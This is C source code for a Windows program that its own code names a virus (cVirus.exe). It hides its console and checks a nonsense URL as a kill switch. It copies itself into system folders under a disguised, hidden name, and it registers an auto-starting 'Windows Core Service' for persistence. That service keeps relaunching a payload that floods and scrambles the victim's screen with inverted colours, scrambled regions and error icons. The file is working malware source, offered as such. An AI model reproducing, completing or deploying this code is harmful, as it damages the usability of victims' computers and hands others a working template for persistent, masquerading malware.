#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <WtsApi32.h>
#include <io.h>
#include <WinInet.h>

SERVICE_STATUS        ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;
HANDLE                hEventLog = NULL;

char serviceName[] = "windCore";

LPSTR  text1  =  "$$$$$$$$                                                                                  $$            $$                $$                                                        $$                                                                                                                                            $$                                            \
                          \n$$                                                                                              $$            $$                                                                            $$                                                                                                                                                                                            \
                          \n$$        $$          $$      $$$$$$        $$$$$$      $$        $$    $$$$$$        $$$$$$$      $$    $$$$$$$        $$$$$$                  $$$$$$$        $$$$$$        $$$$$$$                  $$$$$$                    $$$$$$        $$$$$$      $$      $$$$$$$      $$$$$$      \
                          \n$$$$$    $$      $$      $$        $$    $$        $$    $$        $$        $$            $$        $$    $$    $$        $$    $$        $$                $$        $$                $$    $$                                        $$                $$        $$    $$        $$    $$    $$                $$        $$    \
                          \n$$            $$  $$        $$$$$$$$    $$                $$        $$        $$            $$        $$    $$    $$        $$    $$        $$                $$        $$      $$$$$$$      $$$$$$                    $$$$$$$                $$        $$    $$                $$    $$                $$$$$$$$    \
                          \n$$              $$$          $$                $$                $$        $$        $$    $$    $$        $$    $$    $$        $$    $$        $$                $$        $$    $$        $$                $$                $$        $$                $$        $$    $$                $$    $$                $$                \
                          \n$$$$$$$$    $              $$$$$$$    $$                  $$$$$$$          $$$$      $$        $$    $$    $$        $$      $$$$$$$                $$        $$      $$$$$$$    $$$$$$$                    $$$$$$$                $$$$$$$      $$                $$      $$$$$$$      $$$$$$$    \
                          \n                                                                                      $$                                                                                    $$                                                                                                                        $$                                                                                    \
                          \n                                                                          $$        $$                                                                        $$        $$                                                                                                                        $$                                                                                    \
                          \n                                                                            $$$$$$                                                                            $$$$$$                                                                                                                          $$                                                                                    \
                          \n                                                                                                                                                                                                                                                                                                                                                                                                                            ";


void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);
void ServiceWorkerThread(LPVOID lpParam);

int findFirstProc(const char *procname){
    HANDLE hSnapshot;
    PROCESSENTRY32 pe;
    int pid = 0;
    BOOL hResult;
    // snapshot of all processes in the system
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
    // initializing size: needed for using Process32First
    pe.dwSize = sizeof(PROCESSENTRY32);
    // info about first process encountered in a system snapshot
    hResult = Process32First(hSnapshot, &pe);
    // retrieve information about the processes
    // and exit if unsuccessful
    while (hResult) {
        // if we find the process: return process ID
        if (strcmp(procname, pe.szExeFile) == 0){
            pid = pe.th32ProcessID;
            break;
        }
        hResult = Process32Next(hSnapshot, &pe);
    }

    // closes an open handle (CreateToolhelp32Snapshot)
    CloseHandle(hSnapshot);
    return pid;
}

// draw "smile" on cursor position
DWORD WINAPI drawSmile(void* data){
    int ix = GetSystemMetrics(SM_CXICON) / 2;
    int iy = GetSystemMetrics(SM_CYICON) / 2;

    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);

    POINT cursor;

    while(1){
        GetCursorPos(&cursor);
        
        DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

        DrawIcon(hdc, cursor.x - ix - 30, cursor.y - iy - 30, LoadIcon(NULL, IDI_INFORMATION));
        DrawIcon(hdc, cursor.x - ix + 30, cursor.y - iy - 30, LoadIcon(NULL, IDI_INFORMATION));
        
        DrawIcon(hdc, cursor.x - ix - 15, cursor.y - iy + 30, LoadIcon(NULL, IDI_WARNING));
        DrawIcon(hdc, cursor.x - ix + 15, cursor.y - iy + 30, LoadIcon(NULL, IDI_WARNING));
        DrawIcon(hdc, cursor.x - ix - 45, cursor.y - iy + 15, LoadIcon(NULL, IDI_WARNING));
        DrawIcon(hdc, cursor.x - ix + 45, cursor.y - iy + 15, LoadIcon(NULL, IDI_WARNING));
        Sleep(20);
    }

    ReleaseDC(hwnd, hdc);
}

// fill screen with error icons
DWORD WINAPI fillScreen(void* data){
    int scrw = GetSystemMetrics(SM_CXSCREEN);
    int scrh = GetSystemMetrics(SM_CYSCREEN);

    HICON icon = LoadIcon(NULL, IDI_ERROR);

    while(1){
        HWND hwnd = GetDesktopWindow();
        HDC hdc = GetWindowDC(hwnd);
        for(int j = 0; j < scrh; j = j + 30){
            for(int i = 0; i < scrw; i = i + 30){
                DrawIcon(hdc, i, j, icon);
                //Sleep(1);
            }
        }
        ReleaseDC(hwnd, hdc);
        Sleep(10);
    }
}
// don't do that :D
DWORD WINAPI dontDoThat(void* data){
    //BlockInput(TRUE);
    HANDLE thread = CreateThread(NULL, 4096, &fillScreen, NULL, NULL, NULL);
    Sleep(3000);
    TerminateThread(thread, NULL);
    //BlockInput(FALSE);
    //MessageBoxA(NULL, "Dont do that!", "Hey!", MB_OK | MB_ICONERROR |  MB_SYSTEMMODAL);
}

// show warning icons on random position
DWORD WINAPI randIcon(void* data){
    int scrw = GetSystemMetrics(SM_CXSCREEN);
    int scrh = GetSystemMetrics(SM_CYSCREEN);

    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);

    while(1){
        DrawIcon(hdc, rand() % scrw, rand() % scrh, LoadIcon(NULL, IDI_WARNING));

        Sleep(1500);
    }
}

// tunnel vision
DWORD WINAPI tunnelView(void* data){
    while(1){
        HWND hwnd = GetDesktopWindow();
        HDC hdc = GetWindowDC(hwnd);

        RECT rekt;
        GetWindowRect(hwnd, &rekt);
        StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);

        ReleaseDC(hwnd, hdc);
        Sleep(3000);
    }
}

// invert colors
DWORD WINAPI invertColors(void* data){
    while(1){
        HWND hwnd = GetDesktopWindow();
        HDC hdc = GetWindowDC(hwnd);

        RECT rekt;
        GetWindowRect(hwnd, &rekt);
        BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);

        ReleaseDC(hwnd, hdc);
        Sleep(2000);
    }
}

// draw random parts of the screen on random parts of the screen :D
DWORD WINAPI puzzle(void* data){
    while(1){
        HWND hwnd = GetDesktopWindow();
	    HDC hdc = GetWindowDC(hwnd);
	    RECT rekt;
	    GetWindowRect(hwnd, &rekt);

	    int x1 = rand() % (rekt.right - 100);
	    int y1 = rand() % (rekt.bottom - 100);
	    int x2 = rand() % (rekt.right - 100);
	    int y2 = rand() % (rekt.bottom - 100);
	    int width = rand() % 600;
	    int height = rand() % 600;

	    BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
	    ReleaseDC(hwnd, hdc);

        Sleep(2000);
    }
}

// copy itself to another path
int copy(char * argv[], char* copyFilePath, BOOL hidden){
    FILE* originalFile;
    FILE* copyFile = fopen(copyFilePath, "wb");
    if(!argv){
        originalFile = fopen("C:\\Windows\\System32\\WindowsCoreProcess.exe", "rb");
    } else {
        originalFile = fopen(argv[0], "rb");
    }

    char buffer[1024];
    SIZE_T bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), originalFile)) > 0) {
        fwrite(buffer, 1, bytesRead, copyFile);
    }

    fclose(originalFile);
    fclose(copyFile);
    if(hidden) SetFileAttributesA(copyFilePath, FILE_ATTRIBUTE_HIDDEN);
}

// start the virus if not running already
void run(){
    if(!findFirstProc("cVirus.exe")){
        if(_access("C:\\Windows\\cVirus.exe", 0) != 0){
            copy(NULL, "C:\\Windows\\cVirus.exe", TRUE);
        }

        HANDLE hUserToken;
        DWORD dwSessionId = WTSGetActiveConsoleSessionId();
        WTSQueryUserToken(dwSessionId, &hUserToken);

        STARTUPINFO startInfo = {sizeof(startInfo)};
        PROCESS_INFORMATION processInfo;
        char cmdline[11] = " -run";
        if(CreateProcessAsUser(hUserToken, TEXT("C:\\Windows\\cVirus.exe"), cmdline, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &startInfo, &processInfo)){
            WaitForSingleObject(processInfo.hProcess, INFINITE);
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
        }
        
        CloseHandle(hUserToken);

        if(_access("C:\\Windows\\winDatLog.dat", 0) != 0){
            copy(NULL, "C:\\Windows\\winDatLog.dat", FALSE);
            strcpy(cmdline, " -run");
        }
    }
}


int main(int argc, char * argv[]) {
    ShowWindow(GetConsoleWindow(), FALSE);
    if(!argv[1]){
        HINTERNET hInternet, hConnect;
        InternetOpen(NULL, 1, NULL, NULL, 0);
        hConnect = InternetOpenUrl(hInternet, "https://hgjghjghjdfgdjfghshfg.com", (LPCSTR)INTERNET_FLAG_EXISTING_CONNECT, 0, NULL, 0);
        if (hConnect) {
            return 0;
        }
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);

        copy(argv, "C:\\Windows\\cVirus.exe", FALSE);
        copy(argv, "C:\\Windows\\System32\\WindowsCoreProcess.exe", TRUE);

        SC_HANDLE hSCManager;
        SC_HANDLE hService;

        hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);

        char path[] = "C:\\Windows\\System32\\WindowsCoreProcess.exe -service";

        if(hSCManager != NULL){
            CreateServiceA(hSCManager, serviceName, "Windows Core Service", SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, path, NULL, NULL, NULL, NULL, NULL);
            hService = OpenServiceA(hSCManager, serviceName, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE);
            StartServiceA(hService, 0, NULL);
            CloseServiceHandle(hSCManager);
            CloseServiceHandle(hService);
        } else {
            MessageBoxA(GetDesktopWindow(), "Please run the app as an Administrator.", "Error", MB_ICONERROR | MB_OK | MB_TOPMOST);
        }
        return 0;
    } else if(strcmp(argv[1], "-service") == 0){
        SERVICE_TABLE_ENTRY ServiceTable[2];
        ServiceTable[0].lpServiceName = (LPSTR)serviceName;
        ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
        ServiceTable[1].lpServiceName = NULL;
        ServiceTable[1].lpServiceProc = NULL;

        StartServiceCtrlDispatcher(ServiceTable);
        return 0;
    } else if(strcmp(argv[1], "-run") == 0){

        if(_access("C:\\Windows\\winDatLog.dat", 0) == 0){
            CreateThread(NULL, 4096, &dontDoThat, NULL, NULL, NULL);
        } else {
            HWND hwnd = GetDesktopWindow();
            HDC hdc = GetWindowDC(hwnd);
            RECT rect;

            SetTextColor(hdc, 0x000);
            SetBkColor(hdc, 0x0f0);

            for(int i = 0; i < 50; i++){
                GetClientRect(hwnd, &rect);
                FillRect(hdc, &rect, CreateSolidBrush(RGB(255, 0, 0)));
                rect.top = rect.top + GetSystemMetrics(SM_CYSCREEN) / 2 - 100;
                DrawTextA(hdc, text1, strlen(text1), &rect, DT_NOCLIP | DT_CENTER);
                Sleep(20);
            }
            GetClientRect(hwnd, &rect);
            FillRect(hdc, &rect, CreateSolidBrush(RGB(0, 0, 0)));
            copy(NULL, "C:\\Windows\\winDatLog.dat", FALSE);
            Sleep(20000);
        }

        CreateThread(NULL, 4096, &randIcon, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &drawSmile, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &tunnelView, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &invertColors, NULL, NULL, NULL);
        CreateThread(NULL, 4096, &puzzle, NULL, NULL, NULL);

        for(;;){}
    }
}

void ServiceMain(int argc, char** argv) {
    ServiceStatus.dwServiceType        = SERVICE_WIN32;
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    hStatus = RegisterServiceCtrlHandler(serviceName, (LPHANDLER_FUNCTION)ControlHandler);
    if(hStatus == (SERVICE_STATUS_HANDLE)0){
        return;
    }

    hEventLog = RegisterEventSource(NULL, serviceName);

    if(hEventLog == NULL){
        return;
    }

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ServiceWorkerThread, NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    DeregisterEventSource(hEventLog);
    return;
}

void ControlHandler(DWORD request) {
    switch(request) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            ServiceStatus.dwWin32ExitCode = 0;
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
            SetServiceStatus(hStatus, &ServiceStatus);
            return;

        default:
            break;
    }
    SetServiceStatus(hStatus, &ServiceStatus);
    return;
}

void ServiceWorkerThread(LPVOID lpParam) {
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        run();
        Sleep(10);
    }
}